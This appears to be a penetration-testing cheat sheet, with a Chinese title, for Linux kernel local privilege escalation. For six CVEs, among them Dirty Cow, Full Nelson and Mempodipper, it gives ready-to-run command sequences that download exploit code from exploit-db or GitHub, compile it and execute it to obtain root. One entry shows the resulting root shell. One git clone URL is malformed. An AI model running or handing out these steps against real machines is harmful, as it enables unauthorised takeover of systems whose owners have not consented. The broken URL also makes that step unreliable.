# linux kernel 内核漏洞exploit

---

## Table of Contents
 * [CVE-2010-2959](#CVE-2010-2959)
 * [CVE-2010-3904](#CVE-2010-3904)
 * [CVE-2010-4258](#CVE-2010-4258)
 * [CVE-2012-0056](#CVE-2012-0056)
 * [CVE-2016-5195](#CVE-2016-5195)
 * [CVE-2019-13272](#CVE-2019-13272)

# CVE-2010-2959
 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
```
$ wget -O i-can-haz-modharden.c https://www.exploit-db.com/download/14814
$ gcc i-can-haz-modharden.c -o i-can-haz-modharden
$ ./i-can-haz-modharden
[+] launching root shell!
# id
uid=0(root) gid=0(root)
```
# CVE-2010-4258 
 Full Nelson Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
```
$ wget -O exploit.c https://www.exploit-db.com/download/15704
$ gcc -o exp exploit.c 
$./exp
```
# CVE-2010-3904
Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
```
$ wget -O exploit.c https://www.exploit-db.com/download/15285
$ gcc -o exp exploit.c  
$ ./exp
```
  
# CVE-2012-0056
 Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
```
$ wget -O exploit.c https://www.exploit-db.com/download/18411 
$ gcc -o mempodipper exploit.c  
$ ./mempodipper
```
  
# CVE-2016-5195
Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```
$ git clone https://github.com/gbonacini/CVE-2016-5195.git
$ cd CVE-2016-5195
$ make
$ ./dcow -s
```

# CVE-2019-13272
桌面环境下Linux Kernel < 5.1.17 内核漏洞提权
```
git clone https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272.git
cd CVE-2019-13272
gcc cve-2019-13272.c -o cve-poc
./cve-poc
```

# 内核漏洞检测工具

* [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
* [jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
